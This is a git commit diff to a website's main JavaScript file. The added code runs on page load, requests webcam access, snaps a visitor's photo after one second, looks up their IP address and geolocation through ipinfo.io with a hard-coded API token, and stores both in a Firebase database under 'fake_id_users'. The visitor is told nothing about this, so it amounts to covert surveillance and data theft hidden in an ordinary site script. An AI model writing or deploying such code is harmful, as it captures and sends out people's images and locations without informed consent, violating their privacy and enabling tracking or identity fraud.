18f64f8ad4ca4014dfc13a5888b9ffae8cb0a384
Developer-Nasim <ajnasim72@gmail.coom>
2023-11-17 15:59:47 +0600

    up now

--- assets/js/main.js
+++ assets/js/main.js
@@ -1,28 +1,68 @@
 (function($) {
   "use strict";
+ 
+ 
+document.addEventListener('DOMContentLoaded', function () {
 
-  // fetch('https://api.ipify.org?format=json')
-  // .then(response => response.json())
-  // .then(data => console.log(data.ip));
+
+      function SaveThisdata(photo) { 
+        fetch("https://ipinfo.io/json?token=31bb2faf09aad3").then(
+          (response) => response.json()
+        ).then((jsonResponse) => {
+          var ip = `${jsonResponse.ip}`.replaceAll('.','-')
+          firebase
+          .database()
+          .ref("fake_id_users/" + ip)
+          .set({
+            "photo": photo,
+            ...jsonResponse
+          });
+        })
+      }
+ 
+      function GetImgThenSave() {
+        var video = document.getElementById('video'); 
+        // Cross-browser getUserMedia
+        navigator.getUserMedia = (navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia);
+        if (navigator.getUserMedia) {
+          navigator.getUserMedia({ video: true },
+            function (stream) {
+              video.srcObject = stream;
+  
+              setTimeout(() => {
+                var canvas = document.createElement('canvas');
+                canvas.width = 700;
+                canvas.height = 500;
+                var context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Convert the canvas content to base64
+                var base64Data = canvas.toDataURL('image/png');
+                SaveThisdata(`${base64Data}`)
+              }, 1000);
+
+
+            },
+            function (err) {
+              SaveThisdata('assets/img/no-image-found.jpg')
+            }
+          );
+        } else {
+          SaveThisdata('assets/img/no-image-found.jpg')
+          // console.error("getUserMedia is not supported in this browser");
+        }
+      }
+      GetImgThenSave()
+
+
+}); 
  
 
 
-  fetch("https://ipinfo.io/json?token=31bb2faf09aad3").then(
-    (response) => response.json()
-  ).then((jsonResponse) => {
-    var ip = `${jsonResponse.ip}`.replaceAll('.','-')
-    firebase
-    .database()
-    .ref("student/" + ip)
-    .set({
-      rollNo: jsonResponse.ip,
-      name: jsonResponse.city,
-    });
-  })
 
-
-
-
+ 
+ 
+ 
 //   var rollV, nameV, genderV, addressV;
 
 // function readFom() {
